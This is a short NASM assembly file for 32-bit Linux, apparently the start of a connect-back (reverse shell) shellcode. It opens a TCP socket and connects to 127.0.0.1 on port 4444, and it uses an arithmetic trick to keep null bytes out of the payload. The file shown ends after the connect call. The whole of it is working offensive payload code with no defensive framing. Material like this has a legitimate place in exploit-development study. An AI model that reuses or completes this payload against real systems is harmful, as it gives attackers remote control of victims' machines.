```nasm
; nasm -f elf32 connectback.asm
; ld -m elf_i386 connectback.o -o connectback
BITS 32

section .text
global _start

_start:
; Call to socket(2, 1, 0)
push 0x66     ; socketcall()
pop eax 
xor ebx, ebx
inc ebx       ; EBX = 1 for SYS_SOCKET
xor edx, edx  ; Bulding args array for socket() call
push edx      ; proto = 0 (IPPROTO_IP)
push BYTE 0x1 ; SOCK_STREAM
push BYTE 0x2 ; AF_INET
mov ecx, esp  ; ECX contain the array pointer
int 0x80      ; After the call, EAX contains the file descriptor

xchg esi, eax ; ESI = fd

; Call to connect(fd, [AF_INET, 4444, 127.0.0.1], 16)
push 0x66         ; socketcall()
pop eax 
mov edx, 0x02010180 ; Trick to avoid null bytes (128.1.1.2)
sub edx, 0x01010101 ; 128.1.1.2 - 1.1.1.1 = 127.0.0.1
push edx          ; store 127.0.0.1
push WORD 0x5c11  ; push port 4444
inc ebx           ; EBX = 2
push WORD bx      ; AF_INET
mov ecx, esp      ; pointer to sockaddr
push BYTE 0x10    ; 16, size of addrlen
push ecx          ; new pointer to sockaddr
push esi          ; fd pointer
mov ecx, esp      ; ECX contain the array pointer
inc ebx           ; EBX = 3 for SYS_CONNECT
int 0x80          ; EAX contains the connected socket

```